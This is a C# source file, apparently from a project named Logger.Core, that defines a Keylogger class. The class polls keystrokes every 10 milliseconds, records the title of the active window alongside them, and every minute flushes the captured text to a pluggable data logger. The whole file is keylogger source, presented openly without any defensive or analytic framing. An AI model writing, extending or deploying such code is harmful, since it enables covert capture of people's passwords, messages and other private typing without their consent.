using System;
using System.Diagnostics;
using System.Text;
using System.Timers;

namespace Logger.Core
{
    public class Keylogger
    {
        private readonly StringBuilder _keyBuffer;
        private readonly Timer _timerBufferFlush;
        private readonly Timer _timerKeyMine;
        private string _prevWindowTitle;
        private string _windowTitle;
        private IDataLogger DataLogger { get; }

        public bool Enabled
        {
            get { return _timerKeyMine.Enabled || _timerBufferFlush.Enabled; }
            set { _timerKeyMine.Enabled = _timerBufferFlush.Enabled = value; }
        }

        public double FlushInterval
        {
            get { return _timerBufferFlush.Interval; }
            set { _timerBufferFlush.Interval = value; }
        }

        public double MineInterval
        {
            get { return _timerKeyMine.Interval; }
            set { _timerKeyMine.Interval = value; }
        }

        public Keylogger(IDataLogger datalogger)
        {
            DataLogger = datalogger;
            _windowTitle = WindowManager.GetActiveWindowTitle();
            _prevWindowTitle = _windowTitle;
            _keyBuffer = new StringBuilder(1024);
            _timerKeyMine = CreateTimer(10, TimerKeyMineElapsed);
            _timerBufferFlush = CreateTimer(60000, TimerBufferFlushElapsed);
        }

        private void TimerKeyMineElapsed(object sender, ElapsedEventArgs e)
        {
            try
            {
                _windowTitle = WindowManager.GetActiveWindowTitle();

                if (_windowTitle != _prevWindowTitle)
                {
                    _keyBuffer.Append(Environment.NewLine);
                    _keyBuffer.Append(_windowTitle);
                    _keyBuffer.Append(Environment.NewLine);
                    _prevWindowTitle = _windowTitle;
                }

                _keyBuffer.Append(KeyboardManager.GetKeys());

                WriteDebugOutput($"Keys mined: '{_keyBuffer.ToString()}'");
            }
            catch(Exception ex)
            {
                WriteDebugOutput(ex.ToString());
            }
        }

        private void TimerBufferFlushElapsed(object sender, ElapsedEventArgs e)
        {
            try
            {
                WriteDebugOutput($"Buffer flush: '{_keyBuffer.ToString()}'");

                DataLogger.Write(_keyBuffer.ToString());

                _keyBuffer.Clear();
            }
            catch(Exception ex)
            {
                WriteDebugOutput(ex.ToString());
            }
        }

        private static Timer CreateTimer(double interval, ElapsedEventHandler elapsedEventHandler)
        {
            WriteDebugOutput($"Creating new timer with interval of {interval}");

            var timer = new Timer(interval);
            timer.Elapsed += elapsedEventHandler;
            timer.Enabled = true;
            return timer;
        }

        [Conditional("DEBUG")]
        private static void WriteDebugOutput(string message)
        {
            Debug.WriteLine(message);
        }
    }
}